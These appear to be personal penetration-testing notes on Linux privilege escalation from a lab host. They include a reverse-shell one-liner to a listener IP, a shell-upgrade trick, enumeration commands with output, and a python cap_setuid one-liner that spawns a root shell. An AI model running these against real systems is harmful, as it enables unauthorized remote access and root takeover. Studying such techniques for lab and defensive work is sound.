# Linux Privilege Escalation

## Nested Shell Strategy
Always create backup shells immediately after initial access
1. Get initial shell via web exploit
2. Immediately create second shell via different method
3. Upgrade shells and maintain multiple access points

```bash
busybox nc 192.168.45.244 1234 -e sh
```

Upgrade nested shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
(Ctrl-Z)
stty raw -echo; fg
```

# Phase 1: System Information Gathering

## Basic System Info
```
# System details
uname -a
cat /etc/os-release
cat /etc/issue
hostname
whoami
id

# Current user info
groups
cat /etc/passwd | grep -E "(sh|bash)$"
cat /etc/group
sudo -l
```

```
Linux ubuntu 5.15.0-73-generic #80-Ubuntu SMP Mon May 15 15:18:26 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

PRETTY_NAME="Ubuntu 22.04 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

Ubuntu 22.04 LTS \n \l

ubuntu

app

uid=1000(app) gid=1000(app) groups=1000(app)

app

root:x:0:0:root:/root:/bin/bash
app:x:1000:1000:,,,:/home/app:/bin/bash

(sudo requires password)
```

## Running Processes & Services
```
ps aux
ps -ef
systemctl list-units --type=service --state=running
netstat -tulpn
ss -tulpn
```


## SUID/SGID Binaries
```
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find files with capabilities
getcap -r / 2>/dev/null
```

```
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/sudo

/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

Python3.10 has cap_setuid=ep; [according to gtfobins](https://gtfobins.github.io/gtfobins/python/#capabilities), we can use this to gain root:

`/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

![[Pasted image 20250822161749.png]]
